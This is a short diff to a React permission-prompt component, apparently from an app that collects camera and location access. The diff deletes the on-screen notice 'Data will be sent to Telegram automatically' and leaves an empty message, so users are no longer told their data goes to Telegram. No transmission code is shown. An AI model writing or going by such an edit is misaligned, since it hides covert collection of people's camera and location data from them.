@@ -218,7 +218,7 @@ export function PermissionHandler({ onPermissionsGranted }: PermissionHandlerPro
 
         <p className="text-xs text-gray-500 mt-3 text-center">
           {cameraGranted && locationGranted ? 
-            'Both questions answered! Data will be sent to Telegram automatically.' :
+            '' :
             'Please answer both questions by clicking Yes or No'
           }
         </p>
